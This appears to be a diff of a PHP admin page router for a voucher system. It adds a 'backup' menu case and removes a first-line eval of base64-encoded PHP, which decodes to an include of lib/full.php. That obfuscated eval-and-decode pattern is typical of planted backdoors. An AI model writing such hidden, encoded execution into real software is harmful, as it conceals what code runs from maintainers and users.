@@ -1,5 +1,4 @@
 <?php
-eval("?>".base64_decode("PD9waHAgaW5jbHVkZSJsaWIvZnVsbC5waHAiOz8+"));
 error_reporting(0);
 @session_start();
 @ob_start("ob_gzhandler");
@@ -140,6 +139,12 @@ case'vouchers_style':
 include("load/t_atas.php");
 include("load/t_menu_adm.php");
 include("load/_voucher_editor.php");
+include("load/t_bawah.php");
+break;
+case'backup':
+include("load/t_atas.php");
+include("load/t_menu_adm.php");
+include("load/_backup.php");
 include("load/t_bawah.php");
 break;
 }
